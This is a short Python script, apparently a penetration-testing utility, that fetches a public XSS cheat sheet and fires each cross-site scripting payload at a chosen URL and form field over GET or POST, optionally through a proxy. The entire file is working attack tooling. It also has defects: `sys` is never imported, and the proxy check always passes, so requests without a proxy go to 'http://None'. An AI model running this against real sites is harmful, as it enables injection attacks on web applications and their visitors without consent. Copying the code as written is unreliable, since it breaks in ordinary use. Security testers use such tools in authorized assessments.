#!/usr/bin/python

import requests, argparse
from optparse import OptionParser
from xml.dom.minidom import parseString
import urllib.parse

parser = argparse.ArgumentParser()
parser.add_argument('-m', '--method', help='Method to use: GET or POST', required=True)
parser.add_argument('-d', '--data', help='The entire payload with the fields to send with PAYPAY inside the field\n(eg. "field1=PAYPAY&field2=hi")', required=True)
parser.add_argument('-u', '--url', help='URL / Target link', required=True)
parser.add_argument("-L",'--listmode', action="store_true", dest="listmode", help="Load XML file and show available XSS payloads")
parser.add_argument("-r", "--replay", type=int,
                  action="store", dest="replay",
                  help="Send a payload number / Replay payload number from list")

parser.add_argument('-px','--proxy',help='Enable proxy; in this format: 127.0.0.1:8080')

args = parser.parse_args()

replay = None
px = None

XSSURL = "http://htmlpurifier.org/live/smoketests/xssAttacks.xml"
method = args.method
data = args.data
url = args.url
listmode = args.listmode
replay = args.replay
px = args.proxy

def fetchXML():
    """ Connect to  and download XSS cheetsheet"""
    print("[+] Fetching last XSS cheetsheet from ha.ckers.org ...")
    response = requests.get(url=XSSURL)
    xmldata  = response.text
    return xmldata

def parseXML(xmldata):
    """ Parses XML fetched from ha.ckers.org and returns two
        nice py lists for further processing """
    pydata = parseString(xmldata)
    names  = pydata.getElementsByTagName("name")
    codes  = pydata.getElementsByTagName("code")
    return names, codes

def getTextFromXML(node):
    """ Returns text within an XML node """ 
    nodelist = node.childNodes
    rc = []
    for node in nodelist:
        if node.nodeType == node.TEXT_NODE:
            rc.append(node.data)
    return ''.join(rc)

def showXSSPaylods(names, codes):
    for name, code in zip( names, codes ):
        print("[$] Payload %d  : %s" %\
            (names.index(name), getTextFromXML(name)))


def sendPayload(url, data, method, exploit_name, exploit_code):
    
    exploit_name = getTextFromXML(exploit_name)
    exploit_code = getTextFromXML(exploit_code)

    payload = data.replace("PAYPAY", urllib.parse.quote(exploit_code))

    proxy = {'http':'http://%s' % px}

    # sessioning
    s = requests.Session()
    if (method == 'POST'):
        if proxy is not None:
            resp = s.post(url,data=payload, proxies=proxy)
        else:
            resp = s.post(url, data=payload)

        print('HTTP Response Code: ' + str(resp.status_code))
            
    elif (method == 'GET'):
        if proxy is not None:
            resp = s.get(url,params=payload, proxies=proxy)
        else:
            resp = s.get(url, params=payload)
        
        print('HTTP Response Code: ' + str(resp.status_code))
            
    elif (method == None):
        print('exiting...')
        sys.exit()

    else:
        print("[-] sorry! GET or POST methods only!")
        sys.exit()

def main():
    # Fetch XML file from the web
    xmldata = fetchXML()
        
    names, codes = parseXML(xmldata)[0], parseXML(xmldata)[1]
    
    if listmode:
        showXSSPaylods(names, codes)
        sys.exit()
    
    if replay is not None:
        print("[+] Replaying payload %d" % replay)
        exploit_name = names[replay]
        exploit_code = codes[replay]
        sendPayload(url, data, method, exploit_name, exploit_code)
    else:
        indexPayload = 0
        for exploit_name, exploit_code in zip( names, codes ):
            print("[*] sending multiple payloads from the XML list...")
            n = getTextFromXML(exploit_name)
            c = getTextFromXML(exploit_code)
            print("[+] current payload:\n %s - %s " %(n,c))
            sendPayload(url, data, method, exploit_name, exploit_code)
            indexPayload += 1


if __name__ == '__main__':
    main()    